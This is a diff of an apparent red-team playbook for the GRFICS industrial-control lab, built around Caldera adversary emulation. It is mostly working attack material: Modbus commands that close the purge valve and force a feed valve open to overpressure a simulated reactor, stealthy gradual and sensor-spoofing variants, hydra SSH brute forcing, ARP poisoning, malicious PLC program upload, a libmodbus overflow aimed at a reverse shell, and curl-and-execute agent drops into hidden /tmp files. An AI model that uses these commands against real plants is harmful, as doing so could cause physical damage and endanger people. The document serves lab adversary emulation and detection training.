@@ -1,1023 +1,1205 @@
-# GRFICS ICS/OT Attack Chain Design for Caldera
-
-## Environment Reference
-
-### Network Topology
-
-| Zone | Subnet | Assets |
-|------|--------|--------|
-| **ICS Process Net** (`b-ics-net`) | `192.168.95.0/24` | Simulation (.10-.15), PLC (.2), EWS (.5), Router (.200) |
-| **DMZ** (`c-dmz-net`) | `192.168.90.0/24` | HMI (.107), Kali (.6), Caldera (.250), Router (.200) |
-| **Admin** (`a-grfics-admin`) | Docker bridge | All containers (management plane) |
-
-### ICS Asset Inventory
-
-| Asset | IP | Port(s) | Protocol | Role | Credentials |
-|-------|----|---------|----------|------|-------------|
-| Simulation (Feed 1) | 192.168.95.10 | 502/tcp | Modbus TCP | Remote I/O - Feed 1 valve/flow | -- |
-| Simulation (Feed 2) | 192.168.95.11 | 502/tcp | Modbus TCP | Remote I/O - Feed 2 valve/flow | -- |
-| Simulation (Purge) | 192.168.95.12 | 502/tcp | Modbus TCP | Remote I/O - Purge valve/flow | -- |
-| Simulation (Product) | 192.168.95.13 | 502/tcp | Modbus TCP | Remote I/O - Product valve/flow | -- |
-| Simulation (Tank) | 192.168.95.14 | 502/tcp | Modbus TCP | Remote I/O - Pressure/Level | -- |
-| Simulation (Analyzer) | 192.168.95.15 | 502/tcp | Modbus TCP | Remote I/O - Composition (A/B/C) | -- |
-| PLC (OpenPLC) | 192.168.95.2 | 8080/tcp, 502/tcp | HTTP, Modbus | PLC Runtime + Web API | `openplc:openplc` |
-| EWS | 192.168.95.5 | 6080/tcp | HTTP (noVNC) | Engineering Workstation | -- |
-| HMI (SCADA-LTS) | 192.168.90.107 | 8080/tcp | HTTP | Operator HMI | `admin:admin` |
-| Router/FW | 192.168.95.200 / 192.168.90.200 | 5000/tcp | HTTP | Firewall + Suricata IDS | `admin:password` |
-
-### Modbus Register Map (from `mbconfig.cfg` and device scripts)
-
-| Device | IP | Holding Reg [1] (write) | Input Reg [1] | Input Reg [2] | Input Reg [3] |
-|--------|----|------------------------|---------------|---------------|---------------|
-| Feed 1 | .10 | f1_valve_sp (0-65535 = 0-100%) | f1_valve_pos | f1_flow | -- |
-| Feed 2 | .11 | f2_valve_sp | f2_valve_pos | f2_flow | -- |
-| Purge | .12 | purge_valve_sp | purge_valve_pos | purge_flow | -- |
-| Product | .13 | product_valve_sp | product_valve_pos | product_flow | -- |
-| Tank | .14 | -- (read only) | pressure (0-3200 kPa) | level (0-100%) | -- |
-| Analyzer | .15 | -- (read only) | A_in_purge (0-1.0) | B_in_purge | C_in_purge |
-
-### PLC Control Logic Summary (from `326339.st`)
-
-The PLC runs proportional control at 20ms cycle:
-- **f1_valve_sp** = f(product_flow, product_flow_setpoint) with k=20.0, range 0-500
-- **purge_valve_sp** = f(pressure, pressure_sp) with k=-20.0, range 0-3200
-- **f2_valve_sp** = f(a_in_purge, a_setpoint) with k=1.0, range 0-100
-- **product_valve_sp** = f(level, level_sp) with k=-10.0, range 0-100
-- **pressure_override**: reduces product_flow_setpoint when pressure > 2900 kPa
-- **run_bit** (`%QX5.0`): if FALSE, feeds close (0), purge/product open (65535) = safe shutdown
-
-Default setpoints: product_flow=13107, a_setpoint=30801, pressure_sp=55295, override_sp=31675, level_sp=28835.
+# GRFICS ICS/OT Red Team Attack Chain Design
+## Caldera for OT — Adversary Emulation Playbook
 
 ---
 
-## Assumptions
+## 0. Environment Topology Analysis
 
-1. **Network Access**: The attacker starts from the Kali container (192.168.90.6) in the DMZ. The router forwards all traffic between DMZ and ICS net by default (`iptables -P FORWARD ACCEPT`).
-2. **Credentials**: Default credentials are in use on PLC (`openplc:openplc`), HMI (`admin:admin`), and router (`admin:password`). These are discoverable via the 3D walkthrough (sticky notes) or brute force.
-3. **Protocols**: Modbus TCP (port 502) is unauthenticated by design. There is no TLS, no Modbus security, no whitelisting on the Modbus servers.
-4. **Caldera Agent Deployment**: A Sandcat or Manx agent can be deployed on Kali (pre-staged) and later on EWS or PLC after compromise. The Caldera server at 192.168.90.250 is reachable from both DMZ and (via router) ICS net.
-5. **Suricata IDS** on the router may generate alerts for known Modbus signatures but takes no blocking action by default.
-6. **OpenPLC Web API** allows program upload, start/stop, and configuration changes via HTTP with valid credentials.
+Before designing chains, we will map the docker-compose.yml into a threat model.
+
+### Asset Classification
+
+| Container | Role | Network(s) | IP(s) | Key Ports | ICS Asset? |
+|-----------|------|-----------|-------|-----------|------------|
+| `simulation` | Physical process sim + I/O modules | admin, b-ics-net | 192.168.95.10 | 80 (vis), 55555 (JSON API) | ✅ YES |
+| `plc` | OpenPLC (vulnerable libmodbus) | admin, b-ics-net | 192.168.95.2 | 8080 (OpenPLC UI), 502 (Modbus) | ✅ YES |
+| `ews` | Engineering Workstation | admin, b-ics-net | 192.168.95.5 | 6080 (VNC) | ✅ YES |
+| `hmi` | ScadaLTS / Tomcat SCADA HMI | admin, c-dmz-net | 192.168.90.107 | 6081→8080 | ✅ YES |
+| `router` | Firewall + Suricata IDS | admin, b-ics-net, c-dmz-net | .95.200 / .90.200 | — | ⚠️ BOUNDARY |
+| `kali` | Attacker workstation | admin, c-dmz-net | 192.168.90.6 | 6088 | ❌ ATTACKER |
+| `caldera` | C2 / Caldera for OT server | admin, c-dmz-net | 192.168.90.250 | 8888 | ❌ ATTACKER |
+| `elasticsearch` | Log sink | admin | — | 9200 | ❌ INFRA |
+| `logstash` | Log pipeline | admin | — | 5044, 5000 | ❌ INFRA |
+| `kibana` | SOC dashboard | admin | — | 5601 | ❌ INFRA |
+
+### Network Segments and Pivot Points
+
+```
+[ATTACKER SIDE — c-dmz-net 192.168.90.0/24]
+  kali         (.6)
+  caldera      (.250)   ← C2 server
+  hmi          (.107)   ← First ICS pivot point (DMZ-exposed)
+  router       (.200)
+
+          ▼ pivot through router ▼
+
+[ICS SIDE — b-ics-net 192.168.95.0/24]
+  router       (.200)   ← Network boundary (Suricata here)
+  ews          (.5)     ← Engineering workstation
+  plc          (.2)     ← OpenPLC + vulnerable Modbus
+  simulation   (.10)    ← Physical process (TCP 55555)
+```
+
+**Critical insight:** The `hmi` is the only ICS component reachable from the DMZ without crossing the router boundary. It becomes the mandatory pivot point for all chains targeting the ICS-net.
 
 ---
 
-## Attack Chain 1: Stealthy Process Manipulation via Direct Modbus Write
+## 1. Global Assumptions
 
-**Adversary Profile**: Sophisticated attacker targeting process integrity. Goal is to cause a gradual pressure buildup in the reactor to exceed safe operating limits while remaining undetected.
+| # | Assumption | Rationale |
+|---|-----------|-----------|
+| A1 | Attacker starts with access to `kali` container | Kali is the designated attacker node per docker-compose |
+| A2 | Caldera C2 server is running at 192.168.90.250:8888 | Declared in docker-compose |
+| A3 | HMI SSH has a weak/default password (e.g., `admin`/`admin`, `root`/`root`) | GRFICS paper explicitly states weak SSH passwords are intentional |
+| A4 | OpenPLC web interface has default credentials (`openplc`/`openplc`) | OpenPLC ships with documented default credentials |
+| A5 | Modbus (TCP/502) on PLC and simulation is entirely unauthenticated | Stated explicitly in the paper; Modbus by design |
+| A6 | The `libmodbus` library on the PLC is the older vulnerable version | Paper states this was intentionally reverted for exercises |
+| A7 | Router permits Modbus (TCP/502) traffic between DMZ and ICS-net after HMI compromise | HMI is in the ICS domain functionally; realistic pivot |
+| A8 | Caldera agents can reach back to 192.168.90.250:8888 from any compromised host | All containers share the `a-grfics-admin` bridge network |
+| A9 | ScadaLTS HMI connects to PLC via Modbus over the ICS-net | Standard GRFICS architecture per the paper |
+| A10 | No MFA or strong authentication anywhere in the ICS-net | Stated as intentional by design in the paper |
 
-**Kill Chain Summary**: DMZ foothold -> Network discovery -> Pivot through router -> Modbus device enumeration -> Process state reconnaissance -> Targeted valve manipulation -> Pressure excursion
+---
 
-### Technique Mapping
+## 2. Attack Chain Designs
 
-| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
-|-------|------|---------------|-------------|----------------|--------------------------|
-| **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Deploy Caldera Sandcat agent on Kali via HTTP beacon to `http://192.168.90.250:8888` | Establish C2 channel from DMZ attacker node |
-| **Discovery** | 2 | Remote System Discovery | T0846 | `nmap -sn 192.168.90.0/24` from Kali agent | Discover HMI (.107), Router (.200), Caldera (.250) on DMZ |
-| **Discovery** | 3 | Network Sniffing | T0842 | `tcpdump -i eth0 -nn port 502` on Kali (after pivot) | Observe Modbus traffic patterns between PLC and simulation |
-| **Lateral Movement** | 4 | Default Credentials | T0812 | Route exists via router; use Modbus TCP directly to 192.168.95.x | Pivot from DMZ to ICS network through router |
-| **Discovery** | 5 | Remote System Information Discovery | T0888 | `modbus_cli 192.168.95.10 read_device_info --level 3` for each .10-.15 | Enumerate all 6 Modbus devices, get vendor/product info |
-| **Collection** | 6 | Point & Tag Identification | T0861 | `modbus_cli <ip> read_ir 1 3` for each device | Map register contents to physical process variables |
-| **Collection** | 7 | Monitor Process State | T0801 | Repeatedly read IR[1-2] from Tank (.14) to observe pressure/level trends | Establish baseline: normal pressure ~2450 kPa, level ~65% |
-| **Inhibit Response** | 8 | Manipulation of Control | T0831 | `modbus_cli 192.168.95.12 write_r 1 0` (close purge valve) | Purge valve closes -> pressure begins rising |
-| **Impact** | 9 | Manipulation of Control | T0831 | `modbus_cli 192.168.95.10 write_r 1 65535` (open feed valve fully) | Feed 1 wide open + purge closed -> rapid pressure excursion |
-| **Impact** | 10 | Damage to Property | T0879 | Sustained writes every 100ms to override PLC corrections | Pressure exceeds 3200 kPa -> potential reactor overpressure event |
+---
 
-### Caldera Implementation
+### Chain 1 — "Slow Burn": HMI Compromise → Reconnaissance → Modbus False Data Injection → Reactor Overpressure
 
-#### Step 1: Deploy Agent on Kali
+**Objective:** Blind the operator HMI while injecting false Modbus commands to drive reactor pressure above 3200 kPa, triggering a simulated explosion in the Unity visualization.
 
-From the Caldera web UI (`http://localhost:8888`, login `red:fortiphyd-red`):
+**Attacker Profile:** Nation-state / ICS-aware threat actor (Dragos-style Stage 2 ICS Kill Chain)
 
-1. Navigate to **Agents** -> **Deploy an Agent**
-2. Select **Sandcat** agent, platform **Linux**
-3. Set the app.contact.http to `http://192.168.90.250:8888`
-4. Copy the deployment one-liner. On Kali (via noVNC at `http://localhost:6088`), open a terminal and run:
+#### Stage-by-Stage Breakdown
+
+```
+[Stage 1] Initial Access
+    kali (90.6) → SSH brute-force → hmi (90.107)
+    
+[Stage 2] Execution + Persistence  
+    hmi → deploy Caldera agent → beacon to caldera (90.250)
+    
+[Stage 3] Discovery
+    hmi → nmap scan of 192.168.95.0/24
+    hmi → Modbus enumeration of plc (95.2) and simulation (95.10)
+    
+[Stage 4] Collection
+    hmi → read Modbus registers (process state baseline)
+    
+[Stage 5] Lateral Movement
+    hmi → SSH to ews (95.5) [credential reuse or password spray]
+    
+[Stage 6] Impact — False Data Injection (blind HMI)
+    ews → ARP poison HMI↔PLC path
+    ews → MITM: intercept Modbus read responses, replay falsified safe readings to HMI
+    
+[Stage 7] Impact — Command Injection  
+    ews → Modbus write: force purge valve CLOSED, product valve OPEN
+    simulation (95.10) → reactor pressure climbs → explosion event
+```
+
+#### MITRE ATT&CK for ICS Technique Mapping
+
+| Step | Technique Name | Technique ID | Target | Expected Effect |
+|------|---------------|--------------|--------|-----------------|
+| 1 | Brute Force I/O | T0809 | `hmi` SSH | Shell access as root/admin on HMI container |
+| 2 | Remote System Services: SSH | T0866 | `hmi` | Caldera agent installed, persistent C2 beaconing to 90.250 |
+| 3 | Network Connection Enumeration | T0840 | 95.0/24 subnet | Discovery of plc (95.2), ews (95.5), simulation (95.10) |
+| 3b | Remote System Discovery | T0846 | b-ics-net | Asset inventory: identify PLC model, Modbus device IDs |
+| 4 | Point & Tag Identification | T0861 | `plc` TCP/502 | Map Modbus register addresses to valve positions, pressure readings |
+| 5 | Lateral Tool Transfer | T0867 | `ews` | Caldera agent binary dropped via SCP/curl from `hmi` |
+| 6 | Man in the Middle | T0830 | `plc`↔`hmi` Modbus | Operator sees falsified safe values; actual process diverges |
+| 6b | Spoof Reporting Message | T0856 | HMI Modbus feed | ScadaLTS displays normal pressure while reactor climbs |
+| 7 | Modify Parameter | T0836 | `simulation` via `plc` | Valve positions altered; pressure accumulates |
+| 7b | Loss of View | T0829 | `hmi` | Operator cannot detect process deviation |
+| 7c | Loss of Control | T0827 | `plc`/`simulation` | PLC control loop cannot correct; reactor exceeds 3200 kPa |
+
+---
+
+### Chain 2 — "PLC Reprogramming": EWS Compromise → Malicious Ladder Logic Upload → Sustained Process Sabotage
+
+**Objective:** Compromise the Engineering Workstation, then upload a modified PLC program via the OpenPLC web interface that removes safety interlock logic, causing sustained and repeatable process damage.
+
+**Attacker Profile:** Stuxnet-style targeted ICS sabotage (Stage 2 ICS Kill Chain, physical exploit development)
+
+#### Stage-by-Stage Breakdown
+
+```
+[Stage 1] Initial Access
+    kali (90.6) → exploit ScadaLTS/Tomcat web vulnerability OR SSH brute force → hmi (90.107)
+    
+[Stage 2] Discovery
+    hmi → scan ICS-net → discover ews (95.5) with VNC/SSH open
+    
+[Stage 3] Lateral Movement
+    hmi → SSH password spray to ews (95.5) [credential reuse: admin/admin]
+    ews → Caldera agent deployed
+    
+[Stage 4] Collection — PLC Program Exfiltration
+    ews → HTTP GET http://95.2:8080 → download existing PLC program (.st file)
+    ews → exfiltrate to caldera for offline analysis
+    
+[Stage 5] Impact — Malicious Program Upload
+    ews → HTTP POST to OpenPLC web interface (95.2:8080)
+    → upload modified .st program with:
+       (a) pressure safety interlock REMOVED
+       (b) purge valve forced CLOSED permanently
+       (c) normal HMI polling responses preserved (stealth)
+    
+[Stage 6] Impact — Sustained Sabotage
+    plc → executes malicious ladder logic
+    simulation → reactor pressure climbs unchecked
+    hmi → shows "normal" (plc still responding to reads normally)
+    → explosion event triggers; operator cannot stop it via HMI Stop button
+```
+
+#### MITRE ATT&CK for ICS Technique Mapping
+
+| Step | Technique Name | Technique ID | Target | Expected Effect |
+|------|---------------|--------------|--------|-----------------|
+| 1 | Exploit Public-Facing Application | T0819 | `hmi` Tomcat/ScadaLTS | Web shell or authenticated session on HMI |
+| 2 | Remote System Discovery | T0846 | b-ics-net from `hmi` | Discover `ews` at 95.5 with SSH/VNC |
+| 3 | Valid Accounts | T0859 | `ews` SSH | Login with reused credentials from HMI |
+| 3b | Remote Services | T0886 | `ews` | Shell access, Caldera agent deployed |
+| 4 | Program Upload | T0845 | `plc` HTTP/8080 | PLC .st source file retrieved from OpenPLC UI |
+| 4b | Data from Local System | T0893 | `ews` filesystem | Process diagrams and PLC config files discovered |
+| 5 | Modify Program | T0889 | `plc` OpenPLC web | Malicious ST program replaces legitimate one |
+| 5b | Program Download | T0843 | `plc` HTTP/8080 | Malicious program pushed and activated on OpenPLC |
+| 6 | Loss of Safety | T0837 | `simulation` | Safety interlock on pressure removed at PLC level |
+| 6b | Manipulation of Control | T0831 | `plc`/`simulation` | Sustained valve manipulation; process cannot self-correct |
+| 6c | Damage to Property | T0879 | `simulation` | Reactor overpressure → explosion event (permanent until restart) |
+
+---
+
+### Chain 3 — "Zero-Day Style": Modbus Buffer Overflow → PLC RCE → Caldera Implant → Full Process Control
+
+**Objective:** Exploit the intentionally vulnerable `libmodbus` buffer overflow on the PLC to achieve remote code execution, install a persistent Caldera agent, then use it as an ICS-native C2 implant to issue arbitrary process commands.
+
+**Attacker Profile:** Sophisticated threat actor exploiting known-but-unpatched ICS protocol vulnerability (mirrors real-world Triton/TRISIS style capability development)
+
+#### Stage-by-Stage Breakdown
+
+```
+[Stage 1] Initial Access
+    kali (90.6) → SSH brute force → hmi (90.107)
+    hmi → Caldera agent → beacon to caldera (90.250:8888)
+    
+[Stage 2] Discovery + Vulnerability Validation
+    hmi → Modbus scanner → plc (95.2:502)
+    → confirm FC 0x17 (Write/Read Registers) is available
+    → fingerprint libmodbus version (banner/behavior analysis)
+    
+[Stage 3] Exploitation — libmodbus Buffer Overflow
+    hmi → craft Modbus FC 0x17 frame:
+       - Write arbitrary data to control return address region
+       - Read request > 260 bytes → overflow rsp[MAX_MESSAGE_LENGTH]
+       - Payload: shellcode or ret2libc to /bin/sh or reverse shell
+    → trigger on plc (95.2:502)
+    → RCE achieved as the OpenPLC process user
+    
+[Stage 4] Execution + Persistence on PLC
+    plc → download Caldera agent binary (curl from 90.250 or kali)
+    plc → Caldera agent beacons to caldera (90.250:8888)
+    plc → add agent to cron or /etc/rc.local for persistence
+    
+[Stage 5] Collection from PLC
+    plc agent → read /var/log/plc/* (application logs)
+    plc agent → read PLC program currently loaded
+    plc agent → enumerate Modbus register map from process
+    
+[Stage 6] Impact — Direct Process Manipulation via Native PLC Access
+    plc agent → issue Modbus write directly to simulation (95.10:55555 JSON API via local Modbus)
+    → no need to go through HMI; commands issued from inside the PLC process
+    → valve positions set to: purgevalvesp=0, productvalvesp=100
+    → simulation → pressure exceeds 3200 kPa
+    → repeat after each operator reset (persistence guarantees re-exploitation)
+```
+
+#### MITRE ATT&CK for ICS Technique Mapping
+
+| Step | Technique Name | Technique ID | Target | Expected Effect |
+|------|---------------|--------------|--------|-----------------|
+| 1 | Brute Force I/O | T0809 | `hmi` SSH | Initial foothold on HMI |
+| 2 | Network Connection Enumeration | T0840 | `plc` TCP/502 | Modbus service confirmed; FC 0x17 available |
+| 2b | Point & Tag Identification | T0861 | `plc` Modbus | Register map, function code support fingerprinted |
+| 3 | Exploitation of Remote Services | T0866 | `plc` libmodbus | Buffer overflow via FC_WRITE_AND_READ_REGISTERS >260 bytes → RCE |
+| 4 | System Firmware / Implant | T0857 | `plc` OS | Caldera agent installed in OpenPLC process context |
+| 4b | Hooking | T0874 | `plc` process | Persistence via cron/rc.local; survives service restarts |
+| 5 | Data from Local System | T0893 | `plc` | PLC logs and program exfiltrated |
+| 5b | Automated Collection | T0802 | `plc`/`simulation` | Modbus register values polled continuously |
+| 6 | Modify Parameter | T0836 | `simulation` via `plc` | Valve setpoints forced to unsafe values |
+| 6b | Manipulation of Control | T0831 | `plc`/`simulation` | PLC control loop subverted from within |
+| 6c | Loss of Safety | T0837 | `simulation` | Pressure safety limit bypass; explosion event |
+| 6d | Denial of Control | T0813 | `hmi`→`plc` | Operator Stop commands ignored; PLC controlled by attacker |
+
+---
+
+## 3. Caldera for OT — Step-by-Step Implementation
+
+### 3.0 Caldera Setup and Agent Architecture
+
+```
+caldera (90.250:8888)
+    │
+    ├─ Agent on hmi (90.107)      ← Deployed after SSH brute force
+    ├─ Agent on ews (95.5)        ← Deployed after lateral movement
+    └─ Agent on plc (95.2)        ← Deployed after buffer overflow (Chain 3)
+```
+
+**Agent deployment methods per host:**
 
 ```bash
-server="http://192.168.90.250:8888";
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
-chmod +x splunkd;
-./splunkd -server $server -group red -v
+# On hmi (90.107) — initial agent deployment from kali
+# After SSH brute force succeeds:
+ssh admin@192.168.90.107
+
+# Pull and execute Caldera agent (sandcat)
+curl -s -X POST \
+  -H "file:sandcat.go-linux" \
+  -H "platform:linux" \
+  http://192.168.90.250:8888/file/download > /tmp/.svc && \
+  chmod +x /tmp/.svc && \
+  /tmp/.svc -server http://192.168.90.250:8888 \
+            -group hmi \
+            -v &
 ```
 
-The agent will beacon back and appear in the Caldera Agents panel as the Kali host.
-
-#### Step 2: Create Custom Abilities
-
-Create these ability YAML files and place them in `plugins/modbus/data/abilities/` inside the Caldera container (or use the Caldera REST API).
-
-**Ability: Network Scan (Discovery)**
-
-```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000001
-  name: Nmap ICS Subnet Discovery
-  description: Scan the ICS process network for live Modbus hosts
-  tactic: discovery
-  technique_id: T0846
-  technique_name: Remote System Discovery
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      nmap -sn 192.168.95.0/24 -oG - | grep "Up" | awk '{print $2}'
-    timeout: 60
+```bash
+# On ews (95.5) — after lateral movement from hmi
+# Agent drops via SCP from hmi:
+scp /tmp/.svc admin@192.168.95.5:/tmp/.svc
+ssh admin@192.168.95.5 \
+  "/tmp/.svc -server http://192.168.90.250:8888 -group ews -v &"
 ```
 
-**Ability: Modbus Read Device Info (already exists as `9360ba0d-...`)**
-
-Uses the existing fact source targeting `192.168.95.10:502`.
-
-**Ability: Read Process State (Collection)**
-
-```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000002
-  name: Modbus - Read Tank Pressure and Level
-  description: Read input registers from Tank device to observe pressure and liquid level
-  tactic: collection
-  technique_id: T0801
-  technique_name: Monitor Process State
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2
-    payloads:
-    - modbus_cli
+```bash
+# On plc (95.2) — after buffer overflow exploitation (Chain 3)
+# Reverse shell payload → then pull agent:
+curl http://192.168.90.250:8888/file/download \
+  -H "file:sandcat.go-linux" \
+  -H "platform:linux" \
+  -o /tmp/.plcsvc && \
+  chmod +x /tmp/.plcsvc && \
+  /tmp/.plcsvc -server http://192.168.90.250:8888 -group plc -v &
 ```
 
-**Ability: Read All Process Variables (Collection)**
+---
+
+### 3.1 Full Worked Example — Chain 1 in Caldera
+
+#### Step 1: Create Adversary Profile
+
+Navigate to **Caldera UI → Adversary → New Adversary**
 
 ```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000003
-  name: Modbus - Enumerate All Process I/O
-  description: Read input registers from all 6 Modbus devices to map the process
-  tactic: collection
-  technique_id: T0861
-  technique_name: Point & Tag Identification
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      echo "=== Feed 1 (192.168.95.10) ===" &&
-      ./modbus_cli 192.168.95.10 --port 502 read_ir 1 2 &&
-      ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&
-      echo "=== Feed 2 (192.168.95.11) ===" &&
-      ./modbus_cli 192.168.95.11 --port 502 read_ir 1 2 &&
-      ./modbus_cli 192.168.95.11 --port 502 read_hr 1 1 &&
-      echo "=== Purge (192.168.95.12) ===" &&
-      ./modbus_cli 192.168.95.12 --port 502 read_ir 1 2 &&
-      ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&
-      echo "=== Product (192.168.95.13) ===" &&
-      ./modbus_cli 192.168.95.13 --port 502 read_ir 1 2 &&
-      ./modbus_cli 192.168.95.13 --port 502 read_hr 1 1 &&
-      echo "=== Tank (192.168.95.14) ===" &&
-      ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&
-      echo "=== Analyzer (192.168.95.15) ===" &&
-      ./modbus_cli 192.168.95.15 --port 502 read_ir 1 3
-    payloads:
-    - modbus_cli
-```
-
-**Ability: Close Purge Valve (Impact)**
-
-```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000004
-  name: Modbus - Close Purge Valve
-  description: |
-    Write holding register 1 on Purge device (192.168.95.12) to 0,
-    forcing the purge valve fully closed. This traps gas in the reactor,
-    causing pressure to build.
-  tactic: inhibit-response-function
-  technique_id: T0831
-  technique_name: Manipulation of Control
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      for i in $(seq 1 50); do
-        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;
-        sleep 0.1;
-      done
-    payloads:
-    - modbus_cli
-```
-
-**Ability: Open Feed Valve Fully (Impact)**
-
-```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000005
-  name: Modbus - Force Feed 1 Valve Open
-  description: |
-    Write holding register 1 on Feed 1 device (192.168.95.10) to 65535,
-    forcing maximum inflow. Combined with purge closure, this rapidly
-    increases reactor pressure.
-  tactic: impair-process-control
-  technique_id: T0831
-  technique_name: Manipulation of Control
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      for i in $(seq 1 50); do
-        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
-        sleep 0.1;
-      done
-    payloads:
-    - modbus_cli
-```
-
-#### Step 3: Create Adversary Profile
-
-```yaml
-name: ICS Pressure Manipulation Adversary
+# adversary_chain1_modbus_injection.yml
+id: chain1-grfics-modbus-injection
+name: "GRFICS - Modbus False Data Injection"
 description: >
-  Stealthy attack chain targeting the GRFICS chemical process.
-  Discovers ICS network, enumerates Modbus devices, reads process state,
-  then manipulates valves to cause reactor overpressure.
-adversary_id: cc001111-aaaa-bbbb-cccc-000000000001
-objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+  Simulates an ICS-aware attacker who compromises the HMI via weak SSH,
+  performs ICS-net reconnaissance, and injects false Modbus commands to
+  cause reactor overpressure while blinding the operator HMI.
 atomic_ordering:
-- a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
-- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Read device info (existing)
-- a1b2c3d4-1111-1111-1111-000000000003  # Modbus - Enumerate All Process I/O (Point & Tag Identification : T0861)
-- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
-- a1b2c3d4-1111-1111-1111-000000000004  # Modbus - Close Purge Valve (Manipulation of Control : T0831 )
-- a1b2c3d4-1111-1111-1111-000000000005  # Modbus - Force Feed 1 Valve Open (Manipulation of Control : T0831)
-- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
+  - ability_id: ssh-brute-hmi         # Stage 1
+  - ability_id: deploy-agent-hmi      # Stage 2
+  - ability_id: nmap-ics-net          # Stage 3
+  - ability_id: modbus-enum-plc       # Stage 3b
+  - ability_id: modbus-read-baseline  # Stage 4
+  - ability_id: ssh-lateral-ews       # Stage 5
+  - ability_id: deploy-agent-ews      # Stage 5b
+  - ability_id: arp-poison-hmi-plc    # Stage 6
+  - ability_id: modbus-inject-valves  # Stage 7
 ```
 
-#### Step 4: Configure and Run Operation
+#### Step 2: Define Custom Abilities
 
-Via the Caldera UI:
-
-1. Go to **Operations** -> **Create Operation**
-2. **Name**: `ICS-Pressure-Attack-001`
-3. **Adversary**: `ICS Pressure Manipulation Adversary`
-4. **Fact Source**: `Modbus Sample Facts` (ID `0033b644-...`)
-5. **Planner**: `atomic` (sequential execution)
-6. **Group**: `red` (the Kali agent)
-7. **Autonomous**: `1` (run each step automatically)
-8. Click **Start**
-
-Alternatively, use the REST API:
-
-```bash
-curl -X POST http://localhost:8888/api/v2/operations \
-  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "ICS-Pressure-Attack-001",
-    "adversary": {"adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001"},
-    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
-    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
-    "group": "red",
-    "auto_close": false,
-    "autonomous": 1
-  }'
-```
-
-### Expected Telemetry and Logs
-
-| Step | Log Source | What to Observe | Detection Data Component |
-|------|-----------|-----------------|-------------------------|
-| Nmap scan | Router/Suricata (`shared_logs/router/eve.json`) | ICMP sweep + SYN scan alerts | DC0078 (Network Traffic Flow) |
-| Modbus read_device_info | Router/Suricata | Modbus FC=0x2B on port 502 from 192.168.90.6 | DC0082 (Network Traffic Content) |
-| Read input registers | Router/Suricata, PLC daemon.log | Modbus FC=0x04 reads from non-PLC source IP | DC0085 (Network Connection Creation) |
-| Write holding registers | Router/Suricata, PLC daemon.log | Modbus FC=0x06 writes from unauthorized source (192.168.90.6 vs expected 192.168.95.2) | DC0082 (Network Traffic Content) |
-| Pressure excursion | Simulation process_alarms (`shared_logs/simulation/alarms`) | Pressure value exceeding normal range (>3000 kPa) | DC0109 (Process/Event Alarm) |
-| Valve position change | HMI/SCADA-LTS logs (`shared_logs/hmi/catalina`) | Sudden purge valve close + feed valve open event | DC0109 (Process/Event Alarm) |
-
-### Variation: Stealthier Approach
-
-Instead of slamming valves to extremes, write small incremental changes (e.g., reduce purge by 5% every 30 seconds) to stay within normal operating noise:
+**Ability 1 — SSH Brute Force on HMI**
 
 ```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000006
-  name: Modbus - Gradual Purge Reduction
-  description: Incrementally close purge valve to avoid sudden process alarms
-  tactic: impair-process-control
-  technique_id: T0831
-  technique_name: Manipulation of Control
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      val=60000; while [ $val -gt 0 ]; do
-        ./modbus_cli 192.168.95.12 --port 502 write_r 1 $val;
-        val=$((val - 3000));
-        sleep 30;
-      done
-    payloads:
-    - modbus_cli
+# ability: ssh-brute-hmi
+id: ssh-brute-hmi
+name: "SSH Brute Force against HMI"
+tactic: initial-access
+technique:
+  attack_id: T0809
+  name: Brute Force I/O
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      hydra -L /usr/share/wordlists/users.txt \
+            -P /usr/share/wordlists/rockyou.txt \
+            ssh://192.168.90.107 \
+            -t 4 -o /tmp/hmi_creds.txt
+    cleanup: rm -f /tmp/hmi_creds.txt
 ```
 
-This takes ~10 minutes to fully close the valve, giving pressure time to rise gradually and avoiding spike-based alarm thresholds.
-
-### Escalation Path: Dual Valve + Sensor Spoofing
-
-After closing purge and opening feed, simultaneously write false "normal" values to the Tank device's input registers to mask the pressure rise from the PLC's perspective:
+**Ability 2 — Nmap ICS Network Discovery**
 
 ```yaml
-- id: a1b2c3d4-1111-1111-1111-000000000007
-  name: Modbus - Spoof Tank Pressure Reading
-  description: |
-    Write false input register values to the Tank Modbus device,
-    making the PLC believe pressure is normal while it actually rises.
-    Targets IR address 1 on 192.168.95.14.
-  tactic: evasion
-  technique_id: T0856
-  technique_name: Spoof Reporting Message
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      while true; do
-        ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000;
